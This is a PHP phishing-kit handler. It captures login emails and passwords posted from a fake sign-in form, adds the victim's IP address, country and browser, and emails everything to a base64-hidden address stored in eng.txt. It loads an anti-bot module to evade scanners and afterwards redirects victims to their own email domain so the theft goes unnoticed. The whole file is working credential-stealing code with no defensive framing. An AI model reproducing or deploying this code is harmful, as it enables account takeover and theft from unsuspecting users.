<?php
include "antibot.php"; 
function getrealip()
{
 if (isset($_SERVER)){
if(isset($_SERVER["HTTP_X_FORWARDED_FOR"])){
$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
if(strpos($ip,",")){
$exp_ip = explode(",",$ip);
$ip = $exp_ip[0];
}
}else if(isset($_SERVER["HTTP_CLIENT_IP"])){
$ip = $_SERVER["HTTP_CLIENT_IP"];
}else{
$ip = $_SERVER["REMOTE_ADDR"];
}
}else{
if(getenv('HTTP_X_FORWARDED_FOR')){
$ip = getenv('HTTP_X_FORWARDED_FOR');
if(strpos($ip,",")){
$exp_ip=explode(",",$ip);
$ip = $exp_ip[0];
}
}else if(getenv('HTTP_CLIENT_IP')){
$ip = getenv('HTTP_CLIENT_IP');
}else {
$ip = getenv('REMOTE_ADDR');
}
}
return $ip; 
}


$MyipAddress = getrealip();
$ip = $MyipAddress;
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$adddate=date("D M d, Y g:i a");
$adddate2=date("D M d, Y");
$browser = $_SERVER['HTTP_USER_AGENT'];
$browser  =     $_SERVER['HTTP_USER_AGENT'];
$message  =     "=============+[ User Info ]+==============\n";
$message .=     "U-Name : ".$_POST['em']."\n";
$message .=     "P-Word : ".$_POST['ps']."\n";
$message .=     "=============+[ Loc Info ]+===============\n";
$message .=     "I.P-ADD: ".$ip."\n";
$message .=     "=======================================\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .=     "=======================================\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .=     "=======================================\n";
$message .= 	"Browser: ".$browser."\n";
$message .=     "=======================================\n";
$message .=     "Date/Time: ".$adddate."\n";
$message .=     "=======================================\n";
$username = $_POST['em'];
$user = base64_encode($username);
$password = $_POST['ps'];
$parts = explode("@",$username);
$string = $parts['1'];


$sni = 'Rez';
$subj = "ReZ Login $ip $adddate2\n";
$from = "From: M!N3Z\n";
$email_list = file("eng.txt");
$to = base64_decode(implode($email_list));
$c = $_GET['c'];
if(empty($c)){
if(empty($username) || strlen($password) <= 4)  
{
header('Location: ova.php?pageadaclk?sa=L&c=&i=1&C6SORSHOOV9m9D6XG7Qbf777AD_bd9aoHhruf0rYCyuKNkG&a='.$user);
}

else {
mail($to,$subj,$message);
header('Location: ova.php?pageadaclk?sa=L&c=2&i=2&C6SORSHOOV9m9D6XG7Qbf777AD_bd9aoHhruf0rYCyuKNkG&a='.$user);
}
}
/*Done*/
else{
	
	if(empty($username) || strlen($password) <= 4)  
{
header('Location: ova.php?pageadaclk?sa=L&c=2&i=2&C6SORSHOOV9m9D6XG7Qbf777AD_bd9aoHhruf0rYCyuKNkG&a='.$user);
}

else {
mail($to,$subj,$message);
}
	
}
?>
<script>window.parent.window.location.href = 'https://<?php echo $string;?>';</script>